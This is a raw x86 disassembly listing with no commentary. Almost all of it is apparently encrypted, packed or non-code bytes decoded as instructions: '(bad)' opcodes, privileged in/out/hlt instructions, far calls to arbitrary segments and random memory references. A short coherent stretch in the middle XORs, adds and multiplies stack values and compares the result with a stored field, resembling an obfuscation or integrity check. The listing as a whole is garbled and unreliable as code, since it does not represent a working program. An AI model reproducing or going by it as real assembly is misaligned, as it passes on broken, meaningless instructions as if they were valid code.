  419f9f:	mov    edi,fs
  419fa1:	inc    ecx
  419fa2:	scas   eax,DWORD PTR es:[edi]
  419fa3:	dec    ecx
  419fa4:	xchg   edx,eax
  419fa5:	loope  0x419f56
  419fa7:	add    al,0x84
  419fa9:	xor    al,BYTE PTR [ebx-0xeb12c37]
  419faf:	out    0x4,al
  419fb1:	sbb    cl,bh
  419fb3:	mov    eax,edx
  419fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb6:	inc    edi
  419fb7:	and    BYTE PTR [ebp-0x31cff715],0xd2
  419fbe:	out    0x6b,al
  419fc0:	mov    ebx,0x9c1b60eb
  419fc5:	sub    ah,BYTE PTR [edx]
  419fc7:	iret   
  419fc8:	lods   eax,DWORD PTR ds:[esi]
  419fc9:	xchg   ebx,eax
  419fca:	push   eax
  419fcb:	scas   eax,DWORD PTR es:[edi]
  419fcc:	cmp    eax,DWORD PTR [ebp-0x34fac402]
  419fd2:	clc    
  419fd3:	popf   
  419fd4:	sub    bh,dh
  419fd6:	ror    DWORD PTR [esp+ecx*4+0x1d],cl
  419fda:	ret    
  419fdb:	call   0x380f:0x5c4c7b23
  419fe2:	jp     0x419fd5
  419fe4:	jge    0x41a044
  419fe6:	sub    al,cl
  419fe8:	pop    ds
  419fe9:	adc    DWORD PTR ds:0xd694e1ac,eax
  419fef:	or     ebx,ebx
  419ff1:	jne    0x41a05a
  419ff3:	repnz test al,0xa0
  419ff6:	sbb    eax,0x63a4a323
  419ffb:	les    edx,FWORD PTR [esi]
  419ffd:	pop    edx
  419ffe:	jae    0x41a06d
  41a000:	out    0x5a,eax
  41a002:	push   esi
  41a003:	gs imul ebx,edi,0xfffffff3
  41a007:	dec    ebx
  41a008:	adc    esi,ebx
  41a00a:	test   DWORD PTR [esi+0x7bd88b0],eax
  41a010:	adc    al,0x8b
  41a012:	loope  0x41a084
  41a014:	mov    ds:0xa711bb4a,eax
  41a019:	pop    ss
  41a01a:	icebp  
  41a01b:	or     eax,0xecba4dc5
  41a020:	repz fcom QWORD PTR [eax-0x6acd1a8a]
  41a027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a028:	dec    esp
  41a029:	mov    edx,DWORD PTR [edi-0x688be572]
  41a02f:	sbb    eax,eax
  41a031:	and    bh,dh
  41a033:	push   cs
  41a034:	out    dx,al
  41a035:	mov    cl,0xc6
  41a037:	sbb    eax,0xad78a9cb
  41a03c:	adc    ebx,ebx
  41a03e:	cmc    
  41a03f:	push   ebx
  41a040:	jnp    0x419ff5
  41a042:	mov    al,ds:0xdf0341b9
  41a047:	ficomp WORD PTR [ebp+0x4c]
  41a04a:	pushf  
  41a04b:	cmp    ah,BYTE PTR [eax-0x6cab091e]
  41a051:	mov    ebx,0x9d218db8
  41a056:	pop    esi
  41a057:	mov    ah,0xae
  41a059:	push   ds
  41a05a:	cwde   
  41a05b:	mov    dh,0x62
  41a05d:	jmp    0xf249be18
  41a062:	mov    dl,0x4e
  41a065:	retf   
  41a066:	pop    edx
  41a067:	push   cs
  41a068:	hlt    
  41a069:	pop    edi
  41a06a:	bound  esi,QWORD PTR [ebx]
  41a06c:	xchg   BYTE PTR [ebp+0x3b],ch
  41a06f:	sub    DWORD PTR [edi+0x6e],ecx
  41a072:	mov    esi,0x68235682
  41a077:	pop    ebx
  41a078:	jmp    0x41a02f
  41a07a:	fstp   TBYTE PTR [ebp-0x25090586]
  41a080:	les    esp,FWORD PTR [edi-0x6ccfe325]
  41a086:	push   edx
  41a087:	mov    eax,0x918dc3fe
  41a08c:	inc    ebx
  41a08d:	mov    ds:0xe868f359,al
  41a092:	test   al,0xd6
  41a094:	mov    ds:0xcd995bd1,al
  41a099:	pop    es
  41a09a:	mov    edi,0x7502669c
  41a09f:	aad    0xb3
  41a0a1:	add    eax,DWORD PTR [ecx-0x2faf7e5c]
  41a0a7:	ins    BYTE PTR es:[edi],dx
  41a0a8:	aas    
  41a0a9:	nop
  41a0aa:	idiv   BYTE PTR [esi]
  41a0ac:	test   DWORD PTR [edi],esp
  41a0ae:	ins    BYTE PTR es:[edi],dx
  41a0af:	repnz mov dh,0xe3
  41a0b2:	xchg   edx,eax
  41a0b3:	popf   
  41a0b4:	cmp    eax,0x6f370221
  41a0b9:	xlat   BYTE PTR ds:[ebx]
  41a0ba:	out    dx,eax
  41a0bb:	inc    edi
  41a0bc:	mov    WORD PTR [edx+0x8f645ad],gs
  41a0c2:	push   es
  41a0c3:	mov    edx,0xfdb0034d
  41a0c8:	cmp    bl,BYTE PTR [ecx]
  41a0ca:	retf   
  41a0cb:	mov    eax,ds:0xf2ac03fa
  41a0d0:	imul   ebx,DWORD PTR [ecx],0xffffff85
  41a0d3:	cli    
  41a0d4:	fsubr  QWORD PTR [eax]
  41a0d6:	rol    DWORD PTR [edi],0xdd
  41a0d9:	cmp    al,0x67
  41a0db:	push   ds
  41a0dc:	jne    0x41a129
  41a0de:	inc    edi
  41a0df:	pop    eax
  41a0e0:	and    eax,0xe7fe9784
  41a0e5:	lea    edi,[eax]
  41a0e7:	mov    ecx,ebp
  41a0e9:	or     al,0x8f
  41a0eb:	or     edi,edx
  41a0ed:	inc    ecx
  41a0ee:	add    eax,0x5c9924f1
  41a0f3:	xchg   BYTE PTR [ebp-0x6a7ffa5a],cl
  41a0f9:	sub    al,0xe1
  41a0fb:	jns    0x41a0a2
  41a0fd:	lods   eax,DWORD PTR ds:[esi]
  41a0fe:	pop    esp
  41a0ff:	or     eax,0x21a4449e
  41a104:	ret    
  41a105:	sbb    al,0x46
  41a107:	pop    esi
  41a108:	mov    ch,0xef
  41a10a:	sahf   
  41a10b:	xchg   ebx,eax
  41a10c:	imul   edx,edx,0x4a
  41a10f:	adc    esp,ebx
  41a111:	mov    ebx,0x2edb8fb5
  41a116:	jb     0x41a0c2
  41a118:	fwait
  41a119:	mov    dl,0x98
  41a11b:	out    dx,al
  41a11c:	cmp    dh,BYTE PTR [edi+0x69]
  41a11f:	js     0x41a187
  41a121:	adc    BYTE PTR [ebp-0x6b597ead],dl
  41a127:	xor    eax,0xe94deb42
  41a12c:	xchg   ebp,eax
  41a12d:	jae    0x41a150
  41a12f:	rol    BYTE PTR [ebp-0x4d],cl
  41a132:	je     0x41a0eb
  41a134:	dec    ecx
  41a135:	and    eax,DWORD PTR [esi+0x79d44764]
  41a13b:	aas    
  41a13c:	and    eax,DWORD PTR ds:0xe76815b1
  41a142:	pop    ds
  41a143:	cmp    DWORD PTR [eax+0x5c112a3c],ebx
  41a149:	test   BYTE PTR [eax-0x18647b4b],dl
  41a14f:	sbb    ecx,esp
  41a151:	mov    esp,esi
  41a153:	imul   edx,DWORD PTR [ecx],0xffffffb2
  41a156:	pop    edx
  41a157:	lods   al,BYTE PTR ds:[esi]
  41a158:	(bad)  
  41a159:	mov    ebp,0x3002ec3d
  41a15e:	dec    ecx
  41a15f:	les    edx,FWORD PTR [edi-0x37]
  41a162:	lock scas eax,DWORD PTR es:[edi]
  41a164:	imul   DWORD PTR [edx-0x503ed294]
  41a16a:	imul   esi
  41a16c:	in     eax,0xad
  41a16e:	inc    edx
  41a16f:	call   0xbdd8:0x192aa187
  41a176:	add    DWORD PTR [esi-0x2c3b0031],edi
  41a17c:	mov    dh,0x54
  41a17e:	stos   BYTE PTR es:[edi],al
  41a17f:	gs push ecx
  41a181:	sti    
  41a182:	jmp    0x8e8a:0x2131faca
  41a189:	inc    edx
  41a18a:	clc    
  41a18b:	add    BYTE PTR [edi+0x5],ah
  41a18e:	in     eax,dx
  41a18f:	stc    
  41a190:	mov    eax,0x5b76b1ee
  41a195:	xchg   ebp,edi
  41a197:	add    edx,esi
  41a199:	xor    DWORD PTR [ebx-0x2],0x485d61d5
  41a1a0:	and    BYTE PTR ds:0x92ba0ff0,ah
  41a1a6:	adc    BYTE PTR [ebx],bh
  41a1a8:	sbb    eax,0xe7c9d1e
  41a1ad:	out    0xac,al
  41a1af:	cmp    al,0x8c
  41a1b1:	out    0xd5,eax
  41a1b3:	mov    al,ds:0x9a041ee2
  41a1b8:	hlt    
  41a1b9:	test   BYTE PTR [ebx+0x1f88ca05],bh
  41a1bf:	push   ebx
  41a1c0:	retf   0xd2ca
  41a1c3:	mov    BYTE PTR [edx],al
  41a1c5:	je     0x41a1f8
  41a1c7:	in     al,dx
  41a1c8:	mov    bl,dl
  41a1ca:	icebp  
  41a1cb:	lds    esp,FWORD PTR [edx]
  41a1cd:	out    dx,eax
  41a1ce:	cli    
  41a1cf:	test   BYTE PTR ds:0x5d39b4c2,ch
  41a1d5:	div    BYTE PTR [ebx]
  41a1d7:	adc    al,0x62
  41a1d9:	or     bh,cl
  41a1db:	or     BYTE PTR [edi-0x15],0x44
  41a1df:	loop   0x41a1d4
  41a1e1:	and    BYTE PTR [ebp-0x49],ah
  41a1e4:	sub    eax,edi
  41a1e6:	jb     0x41a17f
  41a1e8:	jns    0x41a255
  41a1ea:	mov    dl,0x58
  41a1ec:	aam    0xe7
  41a1ee:	into   
  41a1ef:	jmp    0x41a233
  41a1f1:	pop    ebp
  41a1f2:	aaa    
  41a1f3:	in     eax,0x71
  41a1f5:	out    0x24,al
  41a1f7:	pop    ebp
  41a1f8:	(bad)
  41a1fb:	fcmovu st,st(7)
  41a1fd:	mov    ebx,0x5a01e29d
  41a202:	xor    eax,DWORD PTR [ebx+0x63537bc7]
  41a208:	add    ecx,eax
  41a20a:	mov    dl,0x19
  41a20c:	(bad)  [ebx]
  41a20e:	nop
  41a20f:	adc    eax,0xc5103f37
  41a214:	push   esp
  41a215:	jnp    0x41a25e
  41a217:	push   eax
  41a218:	sub    DWORD PTR [edx+ebx*8],esi
  41a21b:	shl    ah,0x3e
  41a21e:	dec    edx
  41a21f:	dec    edi
  41a221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a222:	xlat   BYTE PTR ds:[ebx]
  41a223:	inc    esp
  41a225:	inc    edi
  41a226:	cli    
  41a227:	out    dx,al
  41a228:	mov    dl,0x31
  41a22a:	xchg   ecx,eax
  41a22b:	inc    ecx
  41a22c:	(bad)  
  41a22d:	xchg   ecx,eax
  41a22e:	jge    0x41a28f
  41a230:	scas   eax,DWORD PTR es:[edi]
  41a231:	sbb    ebx,DWORD PTR [edx+0x376e1254]
  41a237:	fmul   QWORD PTR [edi-0x37]
  41a23a:	mov    cl,0xa1
  41a23c:	mov    edx,0x37ad838
  41a241:	hlt    
  41a242:	or     BYTE PTR [ebp+eax*2+0x54],bh
  41a246:	jb     0x41a230
  41a248:	leave  
  41a249:	jno    0x41a1fa
  41a24b:	imul   ebp,DWORD PTR [ebp+0x68],0x35388af0
  41a252:	ret    
  41a253:	or     esp,0x9ae76258
  41a259:	sahf   
  41a25a:	fisubr WORD PTR [ecx+0x3a7c4554]
  41a260:	xchg   BYTE PTR [ebx-0x3d6748da],bl
  41a266:	shl    DWORD PTR [ebx],cl
  41a268:	in     eax,dx
  41a269:	jbe    0x41a2e9
  41a26b:	lods   al,BYTE PTR ds:[esi]
  41a26c:	mov    edi,0xdfa97c44
  41a271:	xchg   DWORD PTR [edi+0x12795bbd],ecx
  41a277:	addr16 pop ebx
  41a279:	mov    al,ds:0x26c81455
  41a27e:	mov    ebx,0x3f5b825b
  41a283:	or     edi,DWORD PTR [ebx-0x39ecf87a]
  41a289:	rol    DWORD PTR [bp+di-0x3c39],cl
  41a28e:	jne    0x41a212
  41a290:	jmp    0xafc6:0x7436caee
  41a297:	xor    eax,0x2aac1f6d
  41a29c:	push   ecx
  41a29d:	pop    ebp
  41a29e:	(bad)  
  41a29f:	xor    al,0xe5
  41a2a1:	xor    ebx,DWORD PTR [esi-0x48c60047]
  41a2a7:	or     DWORD PTR [eax+0x12],eax
  41a2aa:	jge    0x41a2e4
  41a2ac:	jmp    edx
  41a2ae:	int3   
  41a2af:	push   esp
  41a2b0:	add    esi,edx
  41a2b2:	jl     0x41a27f
  41a2b4:	lock jmp 0x41a2aa
  41a2b7:	xchg   esi,eax
  41a2b8:	inc    edx
  41a2b9:	inc    ecx
  41a2ba:	sub    ebp,DWORD PTR [edx+esi*4]
  41a2bd:	xchg   edi,eax
  41a2be:	adc    al,0x9a
  41a2c0:	dec    edi
  41a2c1:	inc    eax
  41a2c2:	out    0xad,al
  41a2c4:	cmp    edi,DWORD PTR [edi-0x5a]
  41a2c7:	int3   
  41a2c8:	add    eax,0x4eca4e85
  41a2cd:	xor    eax,0x2993f0d2
  41a2d2:	sti    
  41a2d3:	in     eax,dx
  41a2d4:	les    edx,FWORD PTR [ebx+0x33]
  41a2d7:	add    eax,0x83ac204a
  41a2dc:	or     DWORD PTR [edx+0x25],esp
  41a2df:	js     0x41a27c
  41a2e1:	xchg   ebx,eax
  41a2e2:	scas   al,BYTE PTR es:[edi]
  41a2e3:	or     ecx,DWORD PTR [eax+0x33]
  41a2e6:	rol    BYTE PTR [ecx-0x5932cb1d],1
  41a2ec:	sub    edi,esi
  41a2ee:	pusha  
  41a2ef:	js     0x41a302
  41a2f1:	dec    edi
  41a2f2:	cmp    edi,DWORD PTR [ebx+0x681a476e]
  41a2f8:	inc    ebp
  41a2f9:	mov    al,ds:0xb98b9c65
  41a2fe:	fs retf 0x6c24
  41a302:	dec    eax
  41a303:	or     ecx,ecx
  41a305:	ss dec edi
  41a307:	not    DWORD PTR [edx+ebx*2+0x36f03536]
  41a30e:	test   al,0xeb
  41a310:	adc    DWORD PTR [edx-0xd],ebp
  41a313:	mov    ebp,0xe6ec524d
  41a318:	arpl   cx,ax
  41a31a:	(bad)  
  41a31c:	pop    eax
  41a31d:	lahf   
  41a31e:	loop   0x41a364
  41a320:	mov    ebx,edi
  41a322:	inc    eax
  41a323:	sub    BYTE PTR [ecx-0x19fd9772],al
  41a329:	jne    0x41a34f
  41a32b:	fisub  DWORD PTR [esi-0x4d0d1b67]
  41a331:	(bad)  
  41a332:	mov    dh,0xb2
  41a334:	adc    DWORD PTR [edi+0x69],0x318e2a08
  41a33b:	pushf  
  41a33c:	out    0x37,eax
  41a33e:	dec    ecx
  41a33f:	popa   
  41a340:	cwde   
  41a341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a342:	mov    ebx,0xcca70147
  41a347:	sti    
  41a348:	add    DWORD PTR ds:0xe0dd7bed,0xffffffc3
  41a34f:	stos   BYTE PTR es:[edi],al
  41a350:	cdq    
  41a351:	dec    eax
  41a352:	cmp    al,0x77
  41a354:	and    eax,DWORD PTR [ecx]
  41a356:	out    dx,al
  41a357:	outs   dx,DWORD PTR ds:[esi]
  41a358:	aas    
  41a359:	adc    BYTE PTR [ebp+0x12c1d5c0],bl
  41a35f:	std    
  41a360:	xor    DWORD PTR [ebx],edi
  41a362:	sbb    al,0x23
  41a364:	imul   esi,esp,0xffffffc3
  41a367:	mov    al,ds:0x9d47c507
  41a36c:	stc    
  41a36d:	iret   
  41a36e:	sbb    eax,0xd07a3d5a
  41a373:	cmc    
  41a374:	push   ecx
  41a375:	cmp    ch,al
  41a377:	repz add BYTE PTR gs:[eax-0x1],dh
  41a37c:	jmp    0x502a0cd7
  41a381:	or     bh,bh
  41a383:	xor    BYTE PTR [eax-0x343de734],ah
  41a389:	add    DWORD PTR [esp+ebp*4-0x49],0x54cc35cd
  41a391:	inc    edx
  41a392:	inc    eax
  41a393:	repz push 0xffffffdf
  41a396:	or     DWORD PTR ds:0xba1b6f4b,ebx
  41a39c:	mov    ah,0x6f
  41a39e:	inc    esp
  41a39f:	(bad)  
  41a3a0:	lahf   
  41a3a1:	sbb    BYTE PTR [ebp+0x34a3d5db],dh
  41a3a7:	fild   DWORD PTR [ebp+0x16464649]
  41a3ad:	loope  0x41a402
  41a3af:	push   ds
  41a3b0:	pop    ecx
  41a3b1:	(bad)  [ecx]
  41a3b4:	xchg   ebx,eax
  41a3b5:	mov    DWORD PTR [ebx+0x1c],eax
  41a3b8:	leave  
  41a3b9:	or     esi,DWORD PTR [eax]
  41a3bb:	out    0x97,al
  41a3bd:	mov    ecx,0xf7016d47
  41a3c2:	loopne 0x41a3c1
  41a3c4:	test   al,0x8b
  41a3c6:	push   es
  41a3c7:	popa   
  41a3c8:	mov    ebx,0x482b8bb8
  41a3cd:	push   0x6d45cf23
  41a3d2:	mov    WORD PTR [ebx-0x217e9160],es
  41a3d8:	aad    0x24
  41a3da:	inc    eax
  41a3db:	adc    al,0xdb
  41a3dd:	pop    ebp
  41a3de:	mul    DWORD PTR gs:[edx+0x1f]
  41a3e2:	enter  0x4cb,0x58
  41a3e6:	push   esi
  41a3e7:	inc    edx
  41a3e8:	jp     0x41a3eb
  41a3ea:	pop    es
  41a3eb:	fidivr WORD PTR [esp+eax*8+0x6ec3b530]
  41a3f2:	sub    dl,BYTE PTR [eax]
  41a3f4:	add    eax,esi
  41a3f6:	pusha  
  41a3f7:	sub    eax,0xb06a1ca
  41a3fc:	or     DWORD PTR ss:[ecx-0x39f4c3d8],eax
  41a403:	adc    al,0xb9
  41a405:	sub    eax,0x75ed7ba9
  41a40a:	test   al,0xef
  41a40c:	pop    edi
  41a40d:	sbb    eax,0x3867ec5c
  41a412:	sub    ecx,DWORD PTR [eax-0x3f]
  41a415:	pop    edi
  41a416:	sub    eax,0x4181692c
  41a41b:	sbb    ecx,edi
  41a41d:	xchg   dh,dh
  41a41f:	test   edi,ebx
  41a421:	call   FWORD PTR [esp+ebp*1-0x7fe014fb]
  41a428:	xlat   BYTE PTR ds:[ebx]
  41a429:	vpand  xmm5,xmm3,XMMWORD PTR [edx]
  41a42d:	mov    ecx,DWORD PTR [eax]
  41a42f:	xor    esp,DWORD PTR [eax]
  41a431:	dec    ecx
  41a432:	sub    ebx,DWORD PTR [edx+0x25]
  41a435:	nop
  41a436:	dec    ebp
  41a437:	pop    ebx
  41a438:	xor    BYTE PTR [ecx+0x4c3d26b7],dl
  41a43e:	gs and eax,0x6ae3970c
  41a444:	int    0xde
  41a446:	sub    ch,BYTE PTR [eax]
  41a448:	jmp    FWORD PTR [ebp+eax*1+0x5b5352f5]
  41a44f:	scas   al,BYTE PTR es:[edi]
  41a450:	xchg   edi,eax
  41a451:	aas    
  41a452:	fcom   QWORD PTR [edx-0x2183defd]
  41a458:	cmp    eax,DWORD PTR [ebx-0x2b7c78f5]
  41a45e:	jae    0x41a4bb
  41a460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a461:	sbb    ebx,DWORD PTR [eax-0x19]
  41a464:	ja     0x41a438
  41a466:	add    BYTE PTR [eax+0x53],0x45
  41a46a:	jg     0x41a42e
  41a46c:	xchg   ebp,eax
  41a46d:	mov    ecx,0x99d65dbf
  41a472:	jmp    ecx
  41a474:	in     eax,dx
  41a475:	repnz (bad) 
  41a477:	ss push esi
  41a479:	outs   dx,BYTE PTR ds:[esi]
  41a47a:	mov    BYTE PTR [esi],0xe7
  41a47d:	adc    DWORD PTR [edi-0xe],eax
  41a480:	cdq    
  41a481:	xchg   edx,eax
  41a483:	hlt    
  41a484:	arpl   WORD PTR [ebx-0x78],dx
  41a487:	nop
  41a488:	xchg   dh,dl
  41a48a:	jbe    0x41a458
  41a48c:	jno    0x41a47d
  41a48e:	jmp    0x45dfd9a7
  41a493:	jb     0x41a481
  41a495:	mov    dl,0x7b
  41a497:	mov    ds:0xbb728499,al
  41a49c:	cmp    eax,0x4d522654
  41a4a1:	xor    esi,DWORD PTR [ebx]
  41a4a3:	or     al,0x60
  41a4a5:	(bad)  
  41a4a6:	pop    esi
  41a4a7:	out    0xe2,al
  41a4a9:	rol    ebp,1
  41a4ab:	out    dx,al
  41a4ac:	rcr    ecx,1
  41a4ae:	adc    al,0xf6
  41a4b0:	pop    ds
  41a4b1:	ja     0x41a4eb
  41a4b3:	jmp    0x41a4e8
  41a4b5:	repnz add eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8-0x6b9f6d55]
  41a500:	and    ecx,DWORD PTR [eax+0x0]
  41a503:	popa   
  41a504:	(bad)  
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx-0x54]
  41a50a:	jmp    0x250edc8a
  41a50f:	jns    0x41a503
  41a511:	mov    al,ds:0xf29ae8e6
  41a516:	xor    DWORD PTR [ecx],edi
  41a518:	cmp    BYTE PTR [eax+0x6f44e7bf],al
  41a51e:	lds    ecx,FWORD PTR [ebx]
  41a520:	pop    ebp
  41a521:	xor    ebx,edi
  41a523:	mov    esp,0x1661e01f
  41a528:	sub    ebp,DWORD PTR [ebx-0x4e]
  41a52b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a52c:	adc    ah,bl
  41a52e:	les    esp,FWORD PTR [edx-0x4f]
  41a531:	test   DWORD PTR [edx],edi
  41a533:	loop   0x41a5af
  41a535:	adc    dh,BYTE PTR [eax+0x40949133]
  41a53b:	lods   eax,DWORD PTR ds:[esi]
  41a53c:	sub    bl,BYTE PTR [eax-0x5506b267]
  41a542:	mov    ebp,0x9f6d7d5c
  41a547:	aaa    
  41a548:	clc    
  41a549:	add    bh,0xf5
  41a54c:	ja     0x41a4ea
  41a54e:	(bad)
  41a551:	adc    esp,DWORD PTR [edi+0x29a1a252]
  41a557:	int3   
  41a558:	arpl   WORD PTR [ecx-0x7975d443],di
  41a55e:	hlt    
  41a55f:	pop    esp
  41a560:	fdiv   st,st(2)
  41a562:	mov    ebx,DWORD PTR [ebx-0x9]
  41a565:	test   BYTE PTR [edx+eiz*2+0x34ce647e],bl
  41a56c:	lods   eax,DWORD PTR ds:[esi]
  41a56d:	xchg   esi,eax
  41a56e:	jecxz  0x41a5b8
  41a570:	(bad)  
  41a571:	mov    edi,0x9a06a7b8
  41a576:	ret    0x3707
  41a579:	push   edx
  41a57a:	mov    esp,0xae413c8f
  41a57f:	pop    edi
  41a580:	mov    ds:0xcf7757fd,al
  41a585:	adc    BYTE PTR [ebx-0x4b],bh
  41a588:	and    eax,0x79cc25d0
  41a58d:	repz ror DWORD PTR [esi+0x6d6e0532],cl
  41a594:	repz call 0x34de:0x3cc5fa23
  41a59c:	jns    0x41a5a0
  41a59e:	(bad)  
  41a59f:	out    0x4b,eax
  41a5a1:	sbb    DWORD PTR [esi+0x40],0x8b17fcbc
  41a5a8:	mov    bh,0xe1
  41a5aa:	hlt    
  41a5ab:	add    DWORD PTR [eax-0x1660043b],esp
  41a5b1:	loopne 0x41a5ae
  41a5b3:	ret    
  41a5b4:	ja     0x41a5d6
  41a5b6:	mov    dh,BYTE PTR [ecx+ebx*1-0x224781ba]
  41a5bd:	icebp  
  41a5be:	and    eax,0xf334ced2
  41a5c3:	(bad)  
  41a5c4:	push   0x74
  41a5c6:	ins    DWORD PTR es:[edi],dx
  41a5c7:	xchg   esp,esi
  41a5c9:	dec    ecx
  41a5ca:	enter  0x6761,0xef
  41a5ce:	xchg   dl,bl
  41a5d0:	cmp    esi,DWORD PTR [ecx]
  41a5d2:	lods   al,BYTE PTR ds:[esi]
  41a5d3:	pusha  
  41a5d4:	leave  
  41a5d5:	pusha  
  41a5d6:	iret   
  41a5d7:	xlat   BYTE PTR ds:[ebx]
  41a5d8:	clc    
  41a5d9:	jnp    0x41a5b8
  41a5db:	(bad)  
  41a5dc:	mov    ah,0x1d
  41a5de:	dec    eax
  41a5df:	pop    es
  41a5e0:	jns    0x41a614
  41a5e2:	ss dec esp
  41a5e4:	push   ss
  41a5e5:	jne    0x41a57b
  41a5e7:	jge    0x41a593
  41a5e9:	(bad)  
  41a5ea:	adc    DWORD PTR [edx-0x21],edi
  41a5ed:	push   esp
  41a5ee:	jno    0x41a643
  41a5f0:	mov    BYTE PTR [esi],ah
  41a5f2:	int3   
  41a5f3:	addr16 test eax,ebx
  41a5f6:	mov    dl,0xf6
  41a5f8:	rcr    DWORD PTR [edx],cl
  41a5fa:	push   ebp
  41a5fb:	fisttp WORD PTR [edx]
  41a5fd:	mov    ds:0xf3dd43f9,eax
  41a602:	mov    ebp,0xc5066d3c
  41a607:	(bad)  
  41a609:	add    al,0x5d
  41a60b:	mov    esi,0x8a98a84
  41a610:	or     eax,0x80173610
  41a615:	enter  0xf1df,0xfb
  41a619:	rcr    BYTE PTR [esi+0x7b],0xc4
  41a61d:	hlt    
  41a61e:	popf   
  41a61f:	sbb    al,0x3a
  41a621:	pop    ebx
  41a622:	fwait
  41a623:	les    esi,FWORD PTR [eax]
  41a625:	dec    eax
  41a626:	sbb    BYTE PTR [edi-0x13],ah
  41a629:	popf   
  41a62a:	push   ds
  41a62b:	or     eax,0x6b2c473
  41a630:	pop    ebx
  41a631:	hlt    
  41a632:	pop    edi
  41a633:	lahf   
  41a634:	inc    ecx
  41a635:	out    0x2,eax
  41a637:	dec    esi
  41a638:	repnz in eax,0x44
  41a63b:	push   ds
  41a63c:	dec    ebp
  41a63d:	out    0xf4,eax
  41a63f:	cs int 0xaa
  41a642:	out    0x15,al
  41a644:	repnz data16 sub al,0x3d
  41a648:	das    
  41a649:	rsqrtps xmm2,xmm4
  41a64c:	add    BYTE PTR [ebx],0x9b
  41a64f:	aam    0xa
  41a651:	call   0x83bc:0x11a725f9
  41a658:	repnz lds eax,FWORD PTR [ecx-0x13]
  41a65c:	inc    esi
  41a65d:	sbb    DWORD PTR [esi-0x4010b505],esp
  41a663:	add    ebp,DWORD PTR [eax]
  41a665:	shl    DWORD PTR [esi-0x39e0795d],1
  41a66b:	pop    edx
  41a66c:	sti    
  41a66d:	add    bh,dh
  41a66f:	test   BYTE PTR [eax*2-0x2291c90c],bl
  41a676:	dec    edx
  41a677:	inc    esp
  41a678:	dec    ebp
  41a679:	mov    bl,0x1d
  41a67b:	mov    cl,0x30
  41a67d:	sbb    ch,BYTE PTR [esp+ecx*4-0x71758288]
  41a684:	pop    ss
  41a685:	pushf  
  41a686:	push   ds
  41a687:	pop    edi
  41a688:	sahf   
  41a689:	push   edx
  41a68a:	pop    ebx
  41a68b:	or     ebx,DWORD PTR [ecx-0x34]
  41a68e:	mov    gs,WORD PTR es:[ebx-0x319d56fb]
  41a695:	adc    al,0x34
  41a697:	neg    DWORD PTR [edx+0x71776b53]
  41a69d:	cwde   
  41a69e:	int3   
  41a69f:	test   BYTE PTR [ecx],ah
  41a6a1:	fld    DWORD PTR [esi]
  41a6a3:	add    al,0xbd
  41a6a5:	sub    BYTE PTR [ebx-0x47],bl
  41a6a8:	scas   al,BYTE PTR es:[edi]
  41a6a9:	and    DWORD PTR [edx+0x1a457b16],edi
  41a6af:	ret    
  41a6b0:	xchg   ecx,eax
  41a6b1:	test   DWORD PTR [edi+0x38],eax
  41a6b4:	pop    es
  41a6b5:	out    0x38,al
  41a6b7:	inc    edx
  41a6b8:	rol    BYTE PTR [ebp+0x8cfeb65],cl
  41a6be:	cmp    DWORD PTR [edx],esp
  41a6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6c1:	dec    ebx
  41a6c2:	loop   0x41a698
  41a6c4:	dec    esp
  41a6c5:	xor    bl,BYTE PTR [edi-0x6]
  41a6c8:	push   ebp
  41a6c9:	inc    esp
  41a6ca:	clc    
  41a6cb:	jecxz  0x41a70a
  41a6cd:	in     eax,dx
  41a6ce:	cli    
  41a6cf:	inc    esi
  41a6d0:	fs retf 0x1428
  41a6d4:	push   eax
  41a6d5:	adc    eax,0xa919cfbb
  41a6da:	aaa    
  41a6db:	xchg   edi,eax
  41a6dc:	inc    edx
  41a6dd:	lods   al,BYTE PTR ds:[esi]
  41a6de:	outs   dx,BYTE PTR ds:[esi]
  41a6df:	stos   BYTE PTR es:[edi],al
  41a6e0:	jecxz  0x41a66f
  41a6e2:	dec    esp
  41a6e3:	jp     0x41a67c
  41a6e5:	shr    BYTE PTR [ebx-0x59],1
  41a6e8:	mov    ds:0x9cd3636f,al
  41a6ed:	iret   
  41a6ee:	mov    ah,0xc1
  41a6f0:	cmc    
  41a6f1:	or     eax,0x2f6920f0
  41a6f6:	sub    BYTE PTR [edx+ecx*2-0x46],ah
  41a6fa:	pop    esp
  41a6fb:	xchg   esi,eax
  41a6fc:	dec    ebp
  41a6fd:	and    DWORD PTR [edx+ebx*8-0xd],ebp
  41a701:	inc    eax
  41a702:	je     0x41a694
  41a704:	stos   BYTE PTR es:[edi],al
  41a705:	call   0x39e9:0x42c4879b
  41a70c:	add    eax,DWORD PTR [edx]
  41a70e:	jb     0x41a731
  41a710:	mov    bl,0x4
  41a712:	xor    ecx,DWORD PTR [edx+eiz*2-0x75c68369]
  41a719:	nop
  41a71a:	push   esi
  41a71b:	inc    ebp
  41a71c:	(bad)  
  41a71d:	push   DWORD PTR [di]
  41a720:	sar    BYTE PTR [ecx],0x38
  41a723:	into   
